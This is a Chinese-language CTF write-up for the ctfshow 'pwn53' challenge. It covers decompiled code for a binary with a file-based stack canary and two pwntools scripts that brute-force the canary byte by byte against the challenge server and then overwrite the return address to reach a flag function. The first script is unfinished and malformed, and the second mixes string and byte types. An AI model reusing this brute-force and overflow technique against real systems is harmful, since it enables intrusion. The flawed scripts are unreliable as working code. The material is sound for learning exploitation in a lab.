```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn53
```

```
tasike@tasike-VM:~/Desktop$ file pwn53
pwn53: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6b99653799eba7916f9b35c7a4eeb0eb697bceb7, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn53
[*] '/home/tasike/Desktop/pwn53'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit`，没有开启`栈保护`，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  logo(&argc);
  canary();
  ctfshow();
  return 0;
}
```

跟进`canary`

```c
int canary()
{
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen("/canary.txt", "r");
  if ( !stream )
  {
    puts("/canary.txt: No such file or directory.");
    exit(0);
  }
  fread(&global_canary, 1u, 4u, stream);
  return fclose(stream);
}
```

> 把`canary.txt`以只读的模式打开，打开成功则返回`FILE*`指针给`stream`；
>
> 
>
> `fread`函数是一个在C语言中常用的文件读取函数，它的原型是：`size_t fread(void *buffer, size_t size, size_t count, FILE *stream)`。这个函数从指定的文件流中读取数据，最多可以读取count个项，每个项的大小为size个字节。
>
>  
>
> 从`stream`文件流中读取4个字节的数据到全局变量`global_canary`中。

跟进`ctfshow`

```c
int ctfshow()
{
  size_t nbytes; // [esp+4h] [ebp-54h] BYREF
  char v2[32]; // [esp+8h] [ebp-50h] BYREF
  char buf[32]; // [esp+28h] [ebp-30h] BYREF
  int s1; // [esp+48h] [ebp-10h] BYREF
  int v5; // [esp+4Ch] [ebp-Ch]

  v5 = 0;
  s1 = global_canary;
  printf("How many bytes do you want to write to the buffer?\n>");
  while ( v5 <= 31 )
  {
    read(0, &v2[v5], 1u);
    if ( v2[v5] == 10 )
      break;
    ++v5;
  }
  __isoc99_sscanf(v2, "%d", &nbytes);
  printf("$ ");
  read(0, buf, nbytes);
  if ( memcmp(&s1, &global_canary, 4u) )
  {
    puts("Error *** Stack Smashing Detected *** : Canary Value Incorrect!");
    exit(-1);
  }
  puts("Where is the flag?");
  return fflush(stdout);
}
```

> 第10行：把`global_canary`的值赋给`s1`
>
>  
>
> 第12~18行：读入字符到`v2`字符数组中，除非有换行符(ASCII码为10)，否则将读满`v2`
>
>  
>
> 第19行：从字符串`v2`中读取一个`%d`对应类型的数据（`int`类型）到`nbytes`中。
>
>  
>
> 第21行：从标准输入（文件描述符为0）读取`nbytes`字节的数据到`buf`中。
>
>  
>
> 因此第12~21行就输入一个数字就行，然后输入的这个数字就表示要写多少个字节的数据到`buf`中。
>
>  
>
> `memcmp(&s1, &global_canary, 4u)` 是一个C语言函数调用，用于比较两个内存区域的内容。它接受三个参数：
>
> 1. `&s1`：指向第一个内存区域的指针。
> 2. `&global_canary`：指向第二个内存区域的指针。
> 3. `4u`：要比较的字节数。
>
> 该函数将逐个字节地比较两个内存区域的内容，并返回一个整数。如果两个内存区域的内容完全相同，则返回0；如果第一个内存区域的内容小于第二个内存区域的内容，则返回负数；如果第一个内存区域的内容大于第二个内存区域的内容，则返回正数。
>
> 因此第22行显然是`if(0)`

可以在函数表中找到一个`flag`函数

```c
int flag()
{
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  puts(s);
  return fflush(stdout);
}
```

> 显然只要执行`flag`函数就可以得到`flag`

显然能利用的溢出就是`ctfshow`函数中第21行，因此考虑`cyclic(0x30 + 0x4) + p32(flag)`，但是需要注意的是，`s1`与`ebp`距离`0x10`，直接利用`cyclic(0x30 + 0x4)`显然会覆盖`s1`，那么`ctfshow`函数中的第22行就不能保证`if(0)`。

因此，为了不覆盖`s1`，我们需要知道`s1`之前的值，假设之前的值是`num`，那么应构造`cyclic(0x20) + 'num' + cyclic(0x4) + p32(flag)`。

由于`s1`是`unsigned int`类型（因为一般canary不会是负的吧）的，因此直接爆破出`s1`即可（这里我们考虑的是一个字节一个字节爆破，分4层循环，每层循环爆破出`canary`的一个字节）。

`nbytes`取`0x20 + p32 + 0x4 + p32 = 44`



编写`attack53.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'criticle')  # 将日志级别设置为'critical'意味着只有严重的错误或关键事件才会被记录。

flag = 0x08048696

for canary in range(0xFFFFFFFF):
    r = remote('pwn.challenge.ctf.show', 28125)
	r.sendline("44")
	payload = cyclic(0x20) + p32(canary) + cyclic(0x4) + p32(flag)
    
```



```python
from pwn import *

context.log_level = 'critical'

canary = ''

for i in range(4):	
    for c in range(0xFF):
        io = remote('pwn.challenge.ctf.show', 28130)
        io.sendlineafter('>', '-1')
        payload = 'a' * 0x20 + canary + chr(c)
        io.sendafter('$ ', payload)
        io.recv(1)
        ans = io.recv()
        print(ans)

        if b'Canary Value Incorrect!' not in ans:
            print('The index({}),value({})'.format(i, c))
            canary += chr(c)
            break

        else:
            print('tring... ...')

        io.close()

print('canary=', canary)

io = remote('pwn.challenge.ctf.show', 28130)
elf = ELF('./pwn53')
flag = elf.sym['flag']
payload = cyclic(0x20) + canary.encode() + p32(0) * 4 + p32(flag)
io.sendlineafter('>', '-1')
io.sendafter('$ ', payload)
io.interactive()

```

> 采取逐个字节的爆破？四个字节分四层循环，把每个字节爆破出来。
